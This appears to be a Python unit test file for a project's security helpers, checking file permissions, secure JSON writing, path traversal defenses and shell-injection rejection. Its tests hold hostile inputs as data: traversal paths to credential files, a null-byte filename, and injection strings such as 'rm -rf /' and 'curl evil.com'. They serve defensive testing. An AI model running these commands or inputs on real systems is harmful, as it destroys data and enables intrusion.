"""Unit tests for StageSync Security Hardening.

Covers:
1. Strict 0600 file permission enforcement on secrets and tokens.
2. Atomic secure JSON persistence.
3. Path traversal defense on filenames and directories.
4. Shell injection defense in binary executables.
"""

import json
import os
from pathlib import Path
import stat
import tempfile
import unittest

from stagesync.security import (
    enforce_file_permissions,
    sanitize_filename,
    secure_save_json,
    validate_executable,
    validate_safe_path,
)


class TestSecurityHardening(unittest.TestCase):
    """Test suite validating security invariants and attack mitigations."""

    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.base_path = Path(self.temp_dir.name).resolve()

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    # -------------------------------------------------------------------------
    # 1. File Permission Enforcement (0600)
    # -------------------------------------------------------------------------

    def test_enforce_file_permissions_tightens_permissive_file(self) -> None:
        test_file = self.base_path / "secret_credentials.json"
        test_file.write_text('{"client_secret": "super_secret"}')

        # Set to permissive 0666 or 0644
        os.chmod(test_file, 0o666)
        initial_mode = test_file.stat().st_mode & 0o777
        self.assertEqual(initial_mode, 0o666)

        # Enforce 0600
        success = enforce_file_permissions(test_file, 0o600)
        self.assertTrue(success)

        tightened_mode = test_file.stat().st_mode & 0o777
        self.assertEqual(tightened_mode, 0o600)

    def test_enforce_file_permissions_already_strict(self) -> None:
        test_file = self.base_path / "strict_token.json"
        test_file.write_text('{"access_token": "ya29.xyz"}')
        os.chmod(test_file, 0o600)

        success = enforce_file_permissions(test_file, 0o600)
        self.assertTrue(success)
        self.assertEqual(test_file.stat().st_mode & 0o777, 0o600)

    def test_enforce_file_permissions_nonexistent_file(self) -> None:
        missing_file = self.base_path / "missing.json"
        self.assertFalse(enforce_file_permissions(missing_file))

    # -------------------------------------------------------------------------
    # 2. Atomic Secure JSON Writing (0600)
    # -------------------------------------------------------------------------

    def test_secure_save_json_creates_0600_file(self) -> None:
        target = self.base_path / "tokens" / "auth_token.json"
        payload = {"access_token": "abc12345", "refresh_token": "ref999"}

        secure_save_json(target, payload)

        self.assertTrue(target.exists())
        self.assertEqual(target.stat().st_mode & 0o777, 0o600)

        with target.open("r", encoding="utf-8") as f:
            loaded = json.load(f)
        self.assertEqual(loaded, payload)

    def test_secure_save_json_overwrites_permissive_existing_file(self) -> None:
        target = self.base_path / "existing_loose.json"
        target.write_text("{}")
        os.chmod(target, 0o644)

        secure_save_json(target, {"updated": True})
        self.assertEqual(target.stat().st_mode & 0o777, 0o600)

    # -------------------------------------------------------------------------
    # 3. Path Traversal Prevention
    # -------------------------------------------------------------------------

    def test_sanitize_filename_traversal_attempts(self) -> None:
        # UNIX style traversal
        self.assertEqual(sanitize_filename("../../../etc/passwd"), "passwd")
        self.assertEqual(sanitize_filename("../../var/log/secret.mp4"), "secret.mp4")

        # Windows style traversal
        self.assertEqual(sanitize_filename("..\\..\\Windows\\System32\\cmd.exe"), "cmd.exe")

        # Absolute paths
        self.assertEqual(sanitize_filename("/root/.ssh/id_rsa"), "id_rsa")

        # Null byte injection
        self.assertEqual(sanitize_filename("innocent.mp4\x00.exe"), "innocent.mp4.exe")

        # Prohibited special characters
        self.assertEqual(sanitize_filename("video:name?test*file.mp4"), "video_name_test_file.mp4")

    def test_sanitize_filename_fallback_on_empty(self) -> None:
        self.assertTrue(sanitize_filename("").startswith("video_unnamed"))
        self.assertTrue(sanitize_filename(".").startswith("video_unnamed"))
        self.assertTrue(sanitize_filename("..").startswith("video_unnamed"))
        self.assertTrue(sanitize_filename("   ").startswith("video_unnamed"))

    def test_validate_safe_path_valid(self) -> None:
        safe_child = self.base_path / "downloads" / "video_1.mp4"
        resolved = validate_safe_path(self.base_path, safe_child)
        self.assertEqual(resolved, safe_child.resolve())

    def test_validate_safe_path_detects_traversal(self) -> None:
        # Attempt to escape base_path using relative navigation
        malicious = self.base_path / ".." / "escaped.mp4"
        with self.assertRaises(ValueError) as ctx:
            validate_safe_path(self.base_path, malicious)
        self.assertIn("Path traversal violation", str(ctx.exception))

    def test_validate_safe_path_detects_arbitrary_absolute_path(self) -> None:
        unrelated = Path("/etc/shadow")
        with self.assertRaises(ValueError) as ctx:
            validate_safe_path(self.base_path, unrelated)
        self.assertIn("Path traversal violation", str(ctx.exception))

    # -------------------------------------------------------------------------
    # 4. Shell Injection Prevention
    # -------------------------------------------------------------------------

    def test_validate_executable_valid(self) -> None:
        self.assertEqual(validate_executable("ffmpeg"), "ffmpeg")
        self.assertEqual(validate_executable("ffprobe"), "ffprobe")
        self.assertEqual(validate_executable("/usr/bin/ffmpeg"), "/usr/bin/ffmpeg")

    def test_validate_executable_rejects_shell_injections(self) -> None:
        dangerous_inputs = [
            "ffmpeg; rm -rf /",
            "ffmpeg && curl evil.com",
            "ffmpeg | sh",
            "`rm -rf /`",
            "$(whoami)",
            "ffmpeg > /dev/null",
            "ffmpeg\nevil_command",
            "ffmpeg\revil_command",
        ]
        for bad in dangerous_inputs:
            with self.subTest(bad=bad):
                with self.assertRaises(ValueError) as ctx:
                    validate_executable(bad)
                self.assertIn("shell metacharacters", str(ctx.exception))

    def test_validate_executable_rejects_empty(self) -> None:
        with self.assertRaises(ValueError):
            validate_executable("")
        with self.assertRaises(ValueError):
            validate_executable(None)  # type: ignore


if __name__ == "__main__":
    unittest.main()
